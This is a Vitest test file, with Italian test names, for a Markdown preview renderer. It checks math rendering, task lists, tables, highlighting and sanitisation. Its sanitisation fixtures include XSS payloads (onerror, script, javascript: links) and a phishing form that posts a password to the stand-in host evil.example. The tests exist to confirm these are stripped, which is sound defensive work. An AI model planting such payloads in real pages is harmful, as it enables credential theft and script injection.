// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { renderMarkdown } from '../src/render/markdown'

const r = String.raw

describe('anteprima Markdown', () => {
  it('disegna le formule in linea e a blocco', () => {
    const html = renderMarkdown(r`Sia $x^2$ e $$\sum_{n=0}^{\infty} a_n$$ fine` + '\n\n$$\n\\int_0^1 f\n$$\n')
    expect(html).toContain('class="katex"')
    expect(html).toContain('katex-display')
    expect(html).toContain('class="math-block"')
    expect(html).not.toContain('$x^2$')
  })

  it('rispetta le regole di VS Code sui dollari', () => {
    const html = renderMarkdown('costa 5$ e 3$ al chilo')
    expect(html).not.toContain('katex')
    expect(html).toContain('5$ e 3$')
  })

  it('supporta \\$ come dollaro letterale', () => {
    expect(renderMarkdown(r`prezzo \$5`)).toContain('$5')
  })

  it('non interpreta _ e * dentro le formule come Markdown', () => {
    const html = renderMarkdown(r`$a_1 * b_2 * c$`)
    expect(html).not.toContain('<em>')
  })

  it('segnala gli errori nelle formule senza rompere la pagina', () => {
    const html = renderMarkdown(r`$\frac{1}{$ ok`)
    expect(html).toContain('katex-error')
  })

  it('supporta i blocchi ```math come GitHub', () => {
    expect(renderMarkdown('```math\na^2+b^2=c^2\n```')).toContain('katex-display')
  })

  it('supporta la chimica con mhchem', () => {
    expect(renderMarkdown(r`$\ce{H2O}$`)).not.toContain('katex-error')
  })

  it('gestisce elenchi di cose da fare, tabelle e note', () => {
    const html = renderMarkdown('- [x] fatto\n- [ ] da fare\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\nTesto[^1]\n\n[^1]: nota')
    expect(html).toContain('type="checkbox"')
    expect(html).toContain('checked')
    expect(html).toContain('<table')
    expect(html).toContain('footnote')
  })

  it('evidenzia il codice', () => {
    expect(renderMarkdown('```python\ndef f(x):\n    return x\n```')).toContain('hljs-')
  })

  it('rimuove script e attributi pericolosi', () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)"><script>alert(1)</script><a href="javascript:alert(1)">x</a>')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('javascript:')
  })

  it('aggiunge data-line per sincronizzare lo scorrimento', () => {
    const html = renderMarkdown('# Titolo\n\nparagrafo\n\n$$\nx\n$$')
    expect(html).toContain('data-line="0"')
    expect(html).toContain('data-line="2"')
    expect(html).toContain('data-line="4"')
  })

  it('apre i link in una nuova scheda', () => {
    expect(renderMarkdown('[sito](https://example.com)')).toContain('target="_blank"')
  })
})

describe('anteprima della nota di un\'altra persona (link condiviso)', () => {
  const evil = [
    '# Nota',
    '',
    '<form action="https://evil.example/ruba" method="post"><input name="password" type="password"><button>Accedi di nuovo</button></form>',
    '',
    '<style>.shared-top { display: none }</style>',
    '',
    '<textarea>t</textarea> <select><option>o</option></select> <dialog open>finestra</dialog>',
    '',
    '<img src="x" onerror="window.__rubato = 1"> <a href="javascript:alert(1)">link</a>',
    '',
    '- [x] fatto',
    '- [ ] da fare',
  ].join('\n')

  it('toglie moduli, pulsanti, stili e finestre; le caselle restano ma non si cliccano', () => {
    const html = renderMarkdown(evil, { untrusted: true })
    const box = document.createElement('div')
    box.innerHTML = html
    for (const tag of ['form', 'button', 'style', 'textarea', 'select', 'dialog', 'script']) expect(box.querySelector(tag), tag).toBeNull()
    expect(html).not.toMatch(/onerror|javascript:|password/)
    // Anche il campo della password del modulo tolto diventa una casella spenta, senza nome.
    const inputs = [...box.querySelectorAll('input')]
    expect(inputs).toHaveLength(3)
    expect(inputs.every((i) => i.type === 'checkbox' && i.disabled && !i.name)).toBe(true)
    expect(inputs.filter((i) => i.classList.contains('task-checkbox')).map((i) => i.checked)).toEqual([true, false])
    expect(box.querySelector('h1')?.textContent).toBe('Nota')
  })

  it('nelle proprie note le caselle si cliccano; moduli e stili non ci sono nemmeno lì', () => {
    renderMarkdown(evil, { untrusted: true })
    const box = document.createElement('div')
    box.innerHTML = renderMarkdown(`- [ ] da fare\n\n<details><summary>Altro</summary>testo</details>\n\n${evil}`)
    const tasks = [...box.querySelectorAll<HTMLInputElement>('input.task-checkbox')]
    expect(tasks.map((i) => i.disabled)).toEqual([false, false, false])
    expect(box.querySelector('details')).not.toBeNull()
    for (const tag of ['form', 'button', 'style', 'textarea', 'select', 'dialog']) expect(box.querySelector(tag), tag).toBeNull()
    const others = [...box.querySelectorAll('input:not(.task-checkbox)')]
    expect(others.every((i) => (i as HTMLInputElement).disabled && !(i as HTMLInputElement).name)).toBe(true)
  })
})
